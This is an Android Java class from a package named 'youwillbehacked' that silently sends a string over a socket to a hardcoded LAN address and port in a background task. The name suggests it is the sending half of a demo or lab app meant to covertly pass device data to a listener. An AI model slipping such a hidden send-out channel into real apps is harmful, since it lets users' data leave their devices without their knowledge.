package com.example.youwillbehacked;

import android.os.AsyncTask;

import java.io.DataOutput;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;

public class Message_Sender extends AsyncTask<String,Void,Void> {

    public static final int SOCKET_PORT = 6000;
    public static final String SERVER_IP = "192.168.0.6";
    Socket s;
    DataOutput dos;
    PrintWriter pw;
    @Override
    protected Void doInBackground(String... params) {
        String message = params[0];
        try {
            s=new Socket(SERVER_IP,SOCKET_PORT);
            pw=new PrintWriter(s.getOutputStream(),true);
            pw.write(message);
            pw.flush();
            pw.close();
            s.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
}
